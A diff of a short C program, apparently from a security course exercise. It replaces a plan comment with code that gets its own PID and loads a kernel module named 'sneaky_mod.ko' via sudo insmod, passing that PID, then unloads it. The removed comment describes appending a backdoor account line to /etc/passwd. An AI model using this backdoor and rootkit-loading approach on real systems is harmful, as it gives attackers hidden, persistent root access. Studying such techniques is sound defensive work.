@@ -1,20 +1,27 @@
-/* This program will execute system calls by relevant APIS
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <string.h>
 
-1. Copy /etc/passwd file to /tmp/passwd
+int main(void) {
+  //get process ID
+  int PID;
+  PID = getpid();
+   //add number to num
+  char num[20];
+  //get PID into string
+  sprintf(num, "%d", PID);
+  char str[100];
+  strcpy(str, "sudo insmod sneaky_mod.ko");
+  strcat(str, " pid=");
+  strcat(str, num);
+  //attempt to load kernel module using insmod
+  system(str);
+  
+  //attempt to release kernel module use
+  system("sudo rmmod sneaky_mod.ko");
 
-2. open /etc/passwd file, print new line to end of file with a username and password that will allow a desired user to authenticate tothe system: sneakyuser:abs123:2000:2000:sneakyuser:/root:bash
+  return EXIT_SUCCESS;
 
-*/
-
-
-//1. Copy /etc/asswd file to new file --> /tmp/passwd
-
-/* Passing Args to kernel Mod: 1. declare passed variables as global
-use module_param(A, B, C): 
-A - name of variable
-B - variable type
-C - permissions 
-
-
- */
-declare variable as global
+}
